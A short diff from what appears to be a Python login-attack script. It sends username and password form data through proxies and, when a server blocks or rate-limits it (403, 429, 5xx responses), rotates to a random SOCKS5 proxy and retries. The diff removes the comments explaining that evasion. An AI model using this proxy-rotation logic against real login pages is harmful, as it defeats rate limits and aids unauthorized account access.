@@ -43,8 +43,6 @@ def run():
                 str(formDataNamePass): password,
             }, proxies=dict(http=proxy, https=proxy))
             date = datetime.today().strftime('%H:%m:%S')
-            # If the status_code is 429, it means that the server is blocking the request.
-            # Change the proxy in this case
             if r.status_code == 403 or r.status_code == 429 or r.status_code == 500 or r.status_code == 502 or r.status_code == 503 or r.status_code == 504:
                 proxy = f'socks5://{random.choice(proxy_list)}'
                 continue
